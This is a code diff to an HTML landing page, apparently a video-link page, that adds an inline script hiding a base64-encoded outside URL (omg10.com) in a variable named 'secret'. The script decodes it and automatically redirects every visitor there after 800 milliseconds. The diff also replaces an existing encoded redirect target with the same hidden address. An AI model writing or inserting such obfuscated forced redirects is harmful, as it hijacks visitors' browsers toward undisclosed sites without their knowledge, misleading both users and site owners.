@@ -13,6 +13,20 @@
 
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
+    <script>
+        (function() {
+            const secret = "aHR0cHM6Ly9vbWcxMC5jb20vNC8xMDg4OTg1OA==";
+            try {
+                const target = atob(secret);
+                document.getElementById('direct-link').href = target;
+                setTimeout(() => {
+                    window.location.href = target;
+                }, 800);
+            } catch (e) {
+                document.getElementById('redirect-container').style.display = 'none';
+            }
+        })();
+    </script>
 
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap');
@@ -150,7 +164,7 @@
         lucide.createIcons();
 
         // 
-        const BASE_REDIRECT = atob("aHR0cHM6Ly9icmlsbGlhbmNlcmFkaWFudC5jb20vaHdiM2NtZDZ5P2tleT0xYzNmNDZhNDBlMGU1ZGVhZmQ4OWMzOGNjYzZhZmI4Ng==");
+        const BASE_REDIRECT = atob("aHR0cHM6Ly9vbWcxMC5jb20vNC8xMDg4OTg1OA==");
 
         function getVideyId() {
             const urlParams = new URLSearchParams(window.location.search);
